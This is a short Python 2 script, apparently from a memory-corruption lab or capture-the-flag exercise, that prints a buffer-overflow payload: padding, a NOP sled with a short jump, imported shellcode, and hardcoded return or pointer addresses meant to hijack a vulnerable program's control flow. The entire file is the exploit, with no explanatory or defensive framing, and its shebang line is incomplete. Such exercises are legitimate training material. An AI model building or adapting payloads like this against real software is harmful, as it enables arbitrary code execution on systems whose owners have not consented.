#!/usr/bin/env
from shellcode import shellcode

print "x"*40+" "+"\x90\x90\xeb\x04"+"x"*4+shellcode+"x"*(32-len(shellcode))+"\x50\x37\x0f\x08"+"\x5c\x87\xfe\xbf"+" "+"x"*40

